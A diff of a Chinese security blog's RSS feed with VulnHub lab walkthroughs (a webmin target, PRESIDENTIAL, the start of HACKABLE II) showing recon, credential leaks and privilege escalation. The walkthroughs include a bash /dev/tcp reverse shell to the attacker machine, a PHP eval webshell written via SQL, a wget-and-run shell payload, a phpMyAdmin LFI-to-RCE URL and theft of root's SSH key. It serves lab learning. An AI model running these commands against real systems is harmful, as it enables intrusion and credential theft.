+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-493.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;扫描到了一些漏洞，并且看到了一个敏感文件 secret.php，点击 secret.php 文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-494.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 得到了泄漏出来的账户和密码 ripper:Gamespeop&lt;/p&gt;
+&lt;h3 id=&#34;可访问文件筛选&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可访问文件筛选&#34;&gt;#&lt;/a&gt; 可访问文件筛选&lt;/h3&gt;
+&lt;p&gt;爆出来的密码可能是 ssh 连接的密码，也可能是网站后台密码，通过 ssh 连接判断是否能登陆到对方的服务器上&lt;br&gt;
+ &lt;code&gt;ssh 192.168.31.84 -l ripper&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-495.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到 ripper 的权限，尝试去拿 root 账户的权限&lt;/p&gt;
+&lt;p&gt;查询目录结构，看到出了 ripper 之外的另外一个用户 cubes&lt;br&gt;
+ 查看出了基础的几个基本目录后，是否有其他文件是这两个用户能操作的&lt;br&gt;
+ &lt;code&gt;find / -user ripper 2&amp;gt;/dev/null | grep -v “proc\|home\|run\|sys”&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home”&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-496.png&#34; width=&#34;610&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;发现 cubes 可以操作的文件有一个 secret.file 文件，查看后得到密码&lt;br&gt;
+ su cubes 输入密码后成功拿到了 cubes 的权限&lt;/p&gt;
+&lt;p&gt;借助 find 来寻找属于用户 cubes 可以操作的文件&lt;br&gt;
+ &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home\|proc”&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-497.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;备份文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#备份文件泄露&#34;&gt;#&lt;/a&gt; 备份文件泄露&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;cat /var/webmin/backup/miniser.log&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-498.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 找到了敏感信息 webmin 的账户和密码：admin:tokiohotel&lt;/p&gt;
+&lt;p&gt;进入 webmin 的网站后台登陆地址，输入账户密码进入后台 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-499.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在后台中发现有个 terminal 的标志，直接点击此按钮&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-500.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;后台反弹-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台反弹-shell&#34;&gt;#&lt;/a&gt; 后台反弹 shell&lt;/h3&gt;
+&lt;p&gt;点击后在 web 页面就会弹出来一个终端窗口，而且是 root 权限的&lt;/p&gt;
+&lt;p&gt;但是在 web 界面操作并不是很方遍，接下来把此 shell 进行反弹&lt;br&gt;
+ &lt;code&gt;bash - c ‘bash -I &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1’&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-501.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接受反弹的shell，并且美化终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-502.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 最后拿到了一个 root 账户的标准 shell&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -631,173 +688,6 @@ sudo su 使用此密码通过 patrick 来提到 root&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</guid>
-            <title>VULNHUB 29 PRESIDENTIAL</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</link>
-            <category>VULNHUB 21-30</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcHJlc2lkZW50aWFsLTEsNTAwLw==&#34;&gt;https://www.vulnhub.com/entry/presidential-1,500/&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 PRESIDENTIAL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
- &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-723.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.0.153&lt;/p&gt;
-&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-724.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 21,2082&lt;/p&gt;
-&lt;p&gt;发现了一个比较奇怪的端口，用 nmap 扫描其详细信息，发现是 ssh 服务&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-725.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-726.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;没有明显发现，对其目录结构进行扫描&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-727.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocA==&#34;&gt;http://192.168.0.153/config.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-728.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocC5iYWs=&#34;&gt;http://192.168.0.153/config.php.bak&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-729.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 发现了数据库的账户名密码 votebox:casoj3FFASPsbyoRP&lt;/p&gt;
-&lt;p&gt;但是没有数据库的端口开通，发现没法利用，查看 80 端口的网站，看能否找到更多敏感的信息，发现了一个域名，我们就用这个域名做 DNS 解析指向其 ip 地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-730.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;修改本地 hosts 文件，指定规则如下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-731.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ZvdGVub3cubG9jYWw=&#34;&gt;http://votenow.local&lt;/span&gt; 成功显示出来该网站&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-732.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;做一波目录扫描，发现和原 ip 的扫描内容一模一样&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-733.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;wfuzz-扫描子域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-扫描子域名&#34;&gt;#&lt;/a&gt; wfuzz 扫描子域名&lt;/h3&gt;
-&lt;p&gt;既然是域名，何不进行一波子域名的收集，用 subDomainsBrute 爆破子域名&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;python subDomainsBrute.py votenow.local&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-734.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;但是没有扫描到任何目录，需要注意的是我们去识别此域名的子域名，其解析的 ip 地址依然要指向靶机的 IP 地址&lt;/p&gt;
-&lt;p&gt;用 wfuzz 来枚举子域名&lt;br&gt;
- &lt;code&gt;wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H &amp;quot;Host: FUZZ.votenow.local&amp;quot; --hw 854 --hc 400 votenow.local&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;通过这种方法收集的子域名的解析地址都是目标靶机的 ip&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-735.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将扫描到的子域名加入到本地 hosts 文件中&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-736.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;访问网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RhdGFzYWZlLnZvdGVub3cubG9jYWw=&#34;&gt;http://datasafe.votenow.local&lt;/span&gt; , 输入之前泄漏的数据库账户密码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-737.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 拿到 phpmyadmin 的权限&lt;/p&gt;
-&lt;h3 id=&#34;phpmyadmin后台写shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin后台写shell&#34;&gt;#&lt;/a&gt; phpmyadmin 后台写 shell&lt;/h3&gt;
-&lt;p&gt;点击 SQL，尝试执行敏感的 sql 语句，写入 webshell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-738.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-739.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;数据库当前操作用户拥有写权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-740.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;ul&gt;
-&lt;li&gt;secure_file_priv 参数：&lt;br&gt;
-&lt;strong&gt;NULL 不允许导入或导出；/tmp 只允许在 /tmp 目录导入导出；空 不限制目录&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入一句话后门：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php @eval($_POST[&amp;#x27;x&amp;#x27;]);?&amp;gt;&amp;#x27; INTO OUTFILE &amp;#x27;/var/lib/mysql/a.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-741.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;写入失败，可能被过滤掉了，找到密码，看能否修改密码进行破解&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-742.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用 john 破解密码破解失败（此密码应能破解，破解为 Stella）admin:Stella&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-743.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;phpmyadmin-漏洞提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-漏洞提权&#34;&gt;#&lt;/a&gt; phpmyadmin 漏洞提权&lt;/h3&gt;
-&lt;p&gt;接下来可以看一下这个 phpmyadmin 的版本是多少，如果较低的话是可以直接利用现成的 payload 进行提权的&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-744.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;通过 searchsploit 搜索 phpmyadmin4.8.1 找到了 RCE 漏洞的 payload&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-745.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将 paylaod 复制到一个目录下，查阅后开始利用&lt;br&gt;
- &lt;code&gt;python 50457.py datasafe.votenow.local 80 / votebox casoj3FFASPsbyoRP whoami&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-746.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;根据代码内容输入命令之后没有报错说明可以正常使用此 payload, 修改代码中的拿到权限后的执行的操作，让其反弹 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-747.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;但是依然没有反弹 shell 成功，需要进行手动复现&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在SQL语句上写入执行反弹shell的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php system(&amp;quot;wget 192.168.0.152/shell.sh; chmod +x shell.sh; bash shell.sh&amp;quot;);exit;?&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-748.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;写入恶意 payload 成功后，拿取到此页面保存的 cookie 的值&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-749.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;同时需要在 kali 机器上准备好反弹 shell 的代码，等待靶机执行&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-750.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;访问如下网址，最后的后缀是页面的 cookie 的值，成功拿到网站权限&lt;br&gt;
- &lt;code&gt;http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_q6brk6uh6kbpb5t9888v47b3epgcoltl&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-751.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-752.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到了 apache 用户的网站权限&lt;/p&gt;
-&lt;h3 id=&#34;恶意tar命令提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#恶意tar命令提权&#34;&gt;#&lt;/a&gt; 恶意 tar 命令提权&lt;/h3&gt;
-&lt;p&gt;搜索一下有没有相关文件的权限设置错误&lt;br&gt;
- &lt;code&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &#39;proc\|home&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;发现找到一个 admin 组下的一个命令 tarS&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-753.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看 /etc/passwd 确认我们能提权的账户有哪些  &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt; &lt;br&gt;
- 发现有 admin 和 root 两个账户都存在 bash&lt;br&gt;
-john 破解 phpmyadmin 后台时可得到 admin:Stella, &lt;code&gt;su admin&lt;/code&gt;  尝试提权&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-754.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;确认一下 admin 用户下是否有某些可执行文件的特权&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;find&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &amp;#x27;proc\|home&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/tarS -cvf key.tar /root/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xvf key.tar&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;用此有错误权限的 tarS 命令去压缩并解压 root 账户下的 ssh 私钥&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-755.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将私钥文件发送到自己的 kali 机器上，修改权限为 600 ，进行连接需要注意目标机器的 ssh 开放在了 2082 端口&lt;br&gt;
- &lt;code&gt;ssh -p 2082 root@192.168.0.154 -i root/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-756.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</guid>
-            <title>VULNHUB 24 HACKABLELL</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</link>
-            <category>VULNHUB 21-30</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==&#34;&gt;https://www.vulnhub.com/entry/hackable-ii,711/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz&#34;&gt;https://blog.csdn.net/weixin_44687621/article/details/119386683&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-564.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.6&lt;/p&gt;
-&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -p- 192.168.31.6&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-565.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-566.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.6&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-567.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;只看到了一个目录，是 files 文件夹，直接访问此链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=&#34;&gt;http://192.168.31.6/files/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-568.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看此文件指向地址的详细内容:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=&#34;&gt;http://192.168.31.6/files/CALL.html&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-569.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;审查源代码，查看更多的关键信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;网站信息收集之后没有什么关键的信息&lt;/p&gt;
-&lt;h3 id=&#34;ftp-匿名下载上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名下载上传&#34;&gt;#&lt;/a&gt; FTP 匿名下载上传&lt;/h3&gt;
-&lt;p&gt;对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息&lt;/p&gt;
-&lt;p&gt;ftp 192.168.31.6&lt;br&gt;
-get CALL.html&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-572.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-573.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
